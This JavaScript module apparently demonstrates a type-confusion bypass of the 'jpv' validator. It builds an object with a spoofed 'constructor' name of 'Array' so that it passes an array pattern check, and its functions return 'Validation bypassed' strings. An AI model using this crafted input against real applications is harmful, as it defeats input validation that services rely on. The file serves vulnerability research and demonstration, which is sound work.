const express = require('express')
const jpv = require('jpv')

function checkJPVMap(input)
{
	var mapPattern = 
	{
		should_be_map: new Map()
	}
	/*
	Debugging info
	console.log(typeof(mapPattern))
	console.log(mapPattern.constructor.name);
	console.log(input.constructor.name)
	*/

	return ("Validation bypassed: " + jpv.validate(input, mapPattern));
}

function checkJPVArray(input)
{
	var arrayPattern = {
		should_be_arrary: []
	};

	return ("Validation bypassed: " + jpv.validate(input, arrayPattern));
}

//called with every property and its value
function process(key,value) {
    console.log(key + " : "+value);
}

function traverse(o,func) {
    for (var i in o) {
       func.apply(this,[i,o[i]]);  
        if (o[i] !== null && typeof(o[i])=="object") {
            //going one step down in the object tree!!
            traverse(o[i],func);
        }
    }
}

function exampleJPV()
{
	var user_input = {
		should_be_arrary: {"a":"1", 'constructor': {'name':'Array'}}
	};


	traverse(user_input, process);
	//traverse(o, process);
	var pattern = {
		should_be_arrary: []
	};	
	return ("Validation bypassed: " + jpv.validate(user_input, pattern));

	/* 
	var jsonObject = 
	{
		fakeArray: {
			random: "stuff",
			constructor: [].constructor
		}
	};
	const schema = {
		arraylookalike: []
	};
	*/
	
	//return ("Validation is getting bypassed: " + jpv.validate(jsonObject, schema)); 

}

module.exports = {
   checkJPVMap,
   checkJPVArray,
   exampleJPV
}